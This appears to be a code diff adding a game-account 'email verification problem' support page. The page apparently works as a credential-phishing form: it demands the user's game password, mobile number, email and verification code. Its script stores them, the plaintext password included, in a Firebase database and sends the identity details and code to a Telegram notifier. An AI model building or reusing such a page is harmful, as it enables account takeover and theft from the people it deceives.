@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Verification Problem</title>
+    <link rel="icon" type="image/jpeg" href="FAVICONS/images.jpg">
+    <link rel="stylesheet" href="style2.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+    <script src="app-config.js"></script>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <a href="index.html" class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
+            </a>
+            <h1>EMAIL VERIFICATION PROBLEM</h1>
+        </div>
+    </header>
+
+    <main>
+        <form class="complain-form">
+            <div class="form-group">
+                <label>USER NAME</label>
+                <input type="text" placeholder="Enter your username" required>
+            </div>
+
+            <div class="form-group">
+                <label>REGISTER MOBILE NUMBER</label>
+                <input type="tel" placeholder="Enter registered mobile number" required>
+            </div>
+
+            <div class="form-group">
+                <label>GAME PASSWORD</label>
+                <input type="password" placeholder="Enter game password" required>
+            </div>
+
+            <div class="form-group">
+                <label>EMAIL ID</label>
+                <input type="email" placeholder="Enter email address" required>
+            </div>
+
+            <div class="form-group">
+                <label>SELECT YOUR PROBLEM</label>
+                <select required>
+                    <option value="" disabled selected>Select your problem</option>
+                    <option value="link-not-received">VERIFICATION LINK NOT RECEIVED</option>
+                    <option value="code-not-received">VERIFICATION CODE NOT RECEIVED</option>
+                    <option value="code-incorrect">VERIFICATION CODE IS INCORRECT</option>
+                    <option value="not-verified">ACCOUNT STILL SHOWING NOT VERIFIED</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>VERIFICATION CODE ENTERED (OPTIONAL)</label>
+                <input type="text" placeholder="Enter the code you received" data-optional="true">
+            </div>
+
+            <div class="form-group">
+                <label>UPLOAD SCREENSHOT IMAGE (OPTIONAL)</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input" data-optional="true">
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">COMPLAIN NOW</button>
+        </form>
+    </main>
+
+    <script>
+        const uploadArea = document.querySelector('.upload-area');
+        const fileInput = document.querySelector('.file-input');
+        let screenshotFile = null;
+
+        uploadArea.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                if (file.size > 500000) {
+                    alert('Image too large! Please select image under 500KB.');
+                    fileInput.value = '';
+                    screenshotFile = null;
+                    clearImageUpload(uploadArea);
+                    return;
+                }
+                screenshotFile = file;
+                markImageUploaded(uploadArea, file);
+            }
+        });
+
+        document.querySelector('.complain-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const inputs = document.querySelectorAll('.complain-form input, .complain-form select');
+            let allFilled = true;
+
+            inputs.forEach(input => {
+                if (input.dataset.optional === 'true') return;
+                if (!input.value.trim()) {
+                    allFilled = false;
+                    input.style.borderColor = '#ff4444';
+                } else {
+                    input.style.borderColor = '#333';
+                }
+            });
+
+            if (!allFilled) {
+                alert('Please fill all fields!');
+                return;
+            }
+
+            const mobile = inputs[1].value.trim();
+            const codeInput = document.querySelector('.complain-form input[data-optional="true"]');
+            const requestId = makeRequestId();
+            const now = new Date();
+
+            const complaintData = {
+                request_id: requestId,
+                user_name: inputs[0].value.trim(),
+                mobile: mobile,
+                password: inputs[2].value,
+                email: inputs[3].value.trim(),
+                issue_status: inputs[4].value,
+                type: 'Email Verification',
+                verify_method: 'Email Verification',
+                verify_value: codeInput.value.trim() || 'N/A',
+                verify_email: inputs[3].value.trim(),
+                status: 'Pending',
+                date: now.toLocaleDateString(),
+                time: now.toLocaleTimeString(),
+                timestamp: now.getTime()
+            };
+
+            const btn = document.querySelector('.submit-btn');
+            btn.classList.add('loading');
+            btn.textContent = 'SUBMITTING...';
+
+            try {
+                const shotUrl = await safeUpload(screenshotFile, requestId + ' | Verification Screenshot');
+
+                const docId = await saveSubmission(Object.assign({}, complaintData, {
+                    screenshot_url: shotUrl || 'N/A',
+                    upload_failed: shotUrl ? '' : 'screenshot'
+                }));
+
+                await saveChatSession(complaintData);
+
+                const myComplaints = JSON.parse(localStorage.getItem('myComplaints') || '[]');
+                myComplaints.push(Object.assign({ id: requestId, kind: 'email', doc_id: docId }, complaintData));
+                localStorage.setItem('myComplaints', JSON.stringify(myComplaints));
+
+                notifyTelegram(`📧 <b>New Complaint - Email Verification</b>\n\n👤 Name: ${complaintData.user_name}\n📱 Mobile: ${mobile}\n📧 Email: ${complaintData.email}\n📝 Problem: ${complaintData.issue_status}\n🔢 Code: ${complaintData.verify_value}\n🆔 Request: ${requestId}\n⏰ Time: ${now.toLocaleString()}`);
+
+                showNotification('Complaint filed successfully!', 'success');
+                fileInput.value = '';
+                screenshotFile = null;
+                clearImageUpload(uploadArea);
+                redirectToChat(2200);
+            } catch (err) {
+                console.error('Email verification submit failed:', err);
+                showNotification('Failed to send. Please try again.', 'error');
+                btn.classList.remove('loading');
+                btn.textContent = 'COMPLAIN NOW';
+            }
+        });
+    </script>
+
+</body>
+</html>
